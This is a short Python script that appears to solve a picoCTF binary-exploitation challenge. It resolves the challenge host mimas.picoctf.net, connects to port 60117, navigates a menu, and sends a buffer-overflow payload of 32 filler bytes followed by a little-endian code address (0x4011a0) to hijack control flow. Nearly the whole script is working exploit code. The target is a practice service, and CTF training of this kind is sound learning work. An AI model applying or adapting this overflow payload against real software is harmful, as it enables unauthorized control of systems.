import socket
from scapy.all import Ether, IP, UDP, TCP, DNS, DNSQR, sr1

def hex_to_bytes(hex_string: str) -> bytes:
    if hex_string.startswith(('0x', '0X')):
        hex_string = hex_string[2:]

    raw_bytes = bytes.fromhex(hex_string)

    return raw_bytes

def swap_endian(src: str) -> bytes:
    if src.startswith(('0x', '0X')):
        src = src[2:]

    if len(src) % 2 != 0:
        raise ValueError("Hexadecimal string must have an even number of characters.")

    dst = ''
    for i in range(len(src) - 2, -1, -2):
        dst += src[i:i+2]

    dst = hex_to_bytes(dst)

    return dst


packet = IP(dst="192.168.1.1")/UDP()/DNS(rd=1, qd=DNSQR(qname="mimas.picoctf.net"))
response = sr1(packet)
ip = response[DNS].an.rdata 

#val = int(input('Insert your hex address: '), 16)
val = "00000000004011a0"
val = swap_endian(val)
print(val)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((ip,60117))
response = bytearray(1024)

s.recvfrom_into(response, 1024)
request = b'2' + bytes([0x0D]) 
s.send(request)
print(response.decode())
print(request)
input()

s.recvfrom_into(response, 1024)
print(response.decode())
payload = b'a'*32 + val + bytes([0x0D])
s.send(payload)
s.recvfrom_into(response,1024)
print(response.decode())
print(payload)
input()

request = b'4' + bytes([0x0D])
s.send(request)
s.recvfrom_into(response,1024)
print(response.decode())
